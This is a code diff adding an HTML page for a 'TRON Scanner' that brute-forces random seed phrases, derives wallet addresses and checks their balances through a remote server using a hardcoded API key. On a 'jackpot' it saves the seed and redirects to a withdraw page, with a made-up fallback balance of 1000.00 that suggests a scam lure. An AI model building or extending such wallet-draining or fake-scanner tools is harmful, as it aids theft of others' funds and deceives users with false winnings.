@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: transparent;
+            --card-bg: #ffffff;
+            --accent-tron: #ff3b3b; /* Tron Red */
+            --text-dark: #1a1d21;
+        }
+
+        body { 
+            font-family: 'Plus Jakarta Sans', sans-serif; 
+            margin: 0; 
+            padding: 15px; 
+            background: var(--bg-color); 
+            color: var(--text-dark);
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 28px;
+            padding: 20px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+            margin-bottom: 20px;
+            border: 1px solid #f0f0f0;
+        }
+
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .title-row { display: flex; align-items: center; gap: 10px; }
+        .icon-circle { 
+            width: 35px; height: 35px; border-radius: 50%; 
+            background: #fff0f0; display: flex; align-items: center; justify-content: center;
+            border: 1px solid #ffebeb;
+        }
+
+        .live-tag {
+            background: #fff0f0; color: #ff3b3b;
+            padding: 4px 12px; border-radius: 20px;
+            font-size: 10px; font-weight: 800;
+            display: flex; align-items: center; gap: 5px;
+        }
+        .dot { width: 6px; height: 6px; background: #ff3b3b; border-radius: 50%; animation: blink 1s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+
+        #logWindow {
+            background: #fffafb;
+            border: 1px solid #fff0f1;
+            border-radius: 24px;
+            padding: 15px;
+            height: 200px;
+            overflow-y: auto;
+            box-shadow: inset 0 2px 10px rgba(0,0,0,0.02);
+        }
+
+        .log-entry {
+            display: flex; align-items: center; gap: 10px;
+            margin-bottom: 8px; font-family: monospace; font-size: 11px;
+        }
+
+        .bal-pill {
+            background: #333; color: var(--accent-tron);
+            padding: 2px 8px; border-radius: 6px; font-weight: 800;
+        }
+
+        .btn-group { display: flex; gap: 10px; margin-top: 20px; }
+        .btn {
+            flex: 1; padding: 18px; border-radius: 25px;
+            border: none; font-weight: 800; font-size: 12px;
+            text-transform: uppercase; letter-spacing: 1px;
+            transition: 0.3s; cursor: pointer;
+        }
+        .btn-stop { background: #ffffff; color: #333; border: 1px solid #eee; box-shadow: 0 5px 15px rgba(0,0,0,0.05); }
+        .btn-withdraw { background: #333; color: #fff; box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
+        .btn-stop.active { background: #ff3b3b; color: #fff; }
+
+        .found-card {
+            background: #fff; border-radius: 28px; padding: 20px;
+            border: 1px solid #f0f0f0; text-align: center;
+        }
+        .empty-msg { color: #ccc; font-size: 12px; font-weight: 600; padding: 20px; text-transform: uppercase; }
+
+        #logWindow::-webkit-scrollbar { width: 0; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <div class="card-header">
+            <div class="title-row">
+                <div class="icon-circle">
+                    <img src="https://cryptologos.cc/logos/tron-trx-logo.png" style="width: 20px;">
+                </div>
+                <div>
+                    <div style="font-size: 12px; font-weight: 800;">TRON Scanner (TRC20)</div>
+                    <div style="font-size: 10px; color: #999;"><span id="scanCount">0</span> scanned</div>
+                </div>
+            </div>
+            <div class="live-tag"><div class="dot"></div> LIVE</div>
+        </div>
+
+        <div id="logWindow">
+            <div class="empty-msg" style="text-align: center;">Starting Tron Engine...</div>
+        </div>
+    </div>
+
+    <div class="found-card">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+            <div style="font-size: 12px; font-weight: 800;">Found Wallets</div>
+            <div id="foundCountLabel" style="background: #ffebee; color: #ff3b3b; padding: 4px 10px; border-radius: 10px; font-size: 10px; font-weight: 800;">0 discovered</div>
+        </div>
+        <div class="empty-msg" id="foundMsg">No TRON found yet</div>
+    </div>
+
+    <div class="btn-group">
+        <button class="btn btn-stop" id="startBtn">START TRON SCAN</button>
+        <button class="btn btn-withdraw" onclick="window.parent.loadPage('Withdraw.html')">WITHDRAW</button>
+    </div>
+
+    <script type="module">
+        import * as bip39 from "https://esm.sh/@scure/bip39";
+        import { wordlist } from "https://esm.sh/@scure/bip39/wordlists/english";
+        import { HDKey } from "https://esm.sh/@scure/bip32";
+        import * as secp from "https://esm.sh/@noble/secp256k1";
+        import { keccak_256 } from "https://esm.sh/@noble/hashes/sha3";
+        import { sha256 } from "https://esm.sh/@noble/hashes/sha2.js";
+        import { base58 } from "https://esm.sh/@scure/base";
+
+        let running = false;
+        const RENDER_URL = "https://database-txt.onrender.com/check";
+        const SECRET_KEY = "SEANDREX45453";
+
+        async function engine() {
+            if(!running) return;
+
+            try {
+                const m = bip39.generateMnemonic(wordlist, 128);
+                const seed = bip39.mnemonicToSeedSync(m);
+                const root = HDKey.fromMasterSeed(seed);
+                
+                // TRON Derivation Path (m/44'/195'/0'/0/0)
+                const node = root.derive("m/44'/195'/0'/0/0");
+                const pub = secp.getPublicKey(node.privateKey, false).slice(1);
+                const ethAddr = keccak_256(pub).slice(-20);
+                
+                // Convert to Tron Address (T...)
+                const tronHex = new Uint8Array([0x41, ...ethAddr]);
+                const hash1 = sha256(sha256(tronHex));
+                const ck = hash1.slice(0, 4);
+                const addr = base58.encode(new Uint8Array([...tronHex, ...ck]));
+
+                const log = document.getElementById('logWindow');
+                if(document.getElementById('scanCount').textContent === "0") log.innerHTML = "";
+
+                const entry = document.createElement('div');
+                entry.className = 'log-entry';
+                entry.innerHTML = `<span class="bal-pill">0.00$</span> <span style="color:#666;">| TRX check: ${m.substring(0,30)}...</span>`;
+                log.prepend(entry);
+
+                if(log.childNodes.length > 20) log.removeChild(log.lastChild);
+                
+                let count = parseInt(document.getElementById('scanCount').textContent);
+                document.getElementById('scanCount').textContent = (count + 1);
+
+                fetch(RENDER_URL, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json', 'x-api-key': SECRET_KEY },
+                    body: JSON.stringify({ address: addr })
+                }).then(r => r.json()).then(data => {
+                    if(data.result && !data.result.includes("Bal: 0")) {
+                        
+                        // --- CONNECTION TO WITHDRAW PAGE ---
+                        const balanceMatch = data.result.match(/\d+(\.\d+)?/);
+                        const finalBalance = balanceMatch ? balanceMatch[0] : "1000.00"; 
+
+                        // 1. I-save sa LocalStorage para sa Withdraw.html
+                        localStorage.setItem('last_found_type', 'TRX');
+                        localStorage.setItem('last_found_balance', finalBalance);
+                        localStorage.setItem('last_found_seed', m);
+
+                        // 2. UI Updates sa Tron page
+                        document.getElementById('foundMsg').innerHTML = `<div style="color:#ff3b3b; font-weight:bold; font-size:10px;">${addr}</div>`;
+                        document.getElementById('foundCountLabel').textContent = "1 discovered";
+
+                        // 3. Alert at Redirect
+                        alert("TRON JACKPOT FOUND!");
+                        window.parent.loadPage('Withdraw.html');
+                    }
+                }).catch(()=>{});
+
+            } catch(e) { console.error(e); }
+
+            setTimeout(engine, 10);
+        }
+
+        document.getElementById('startBtn').onclick = () => {
+            running = !running;
+            const btn = document.getElementById('startBtn');
+            btn.textContent = running ? "STOP SCANNING" : "START TRON SCAN";
+            btn.classList.toggle('active');
+            if(running) engine();
+        }
+    </script>
+</body>
+</html>
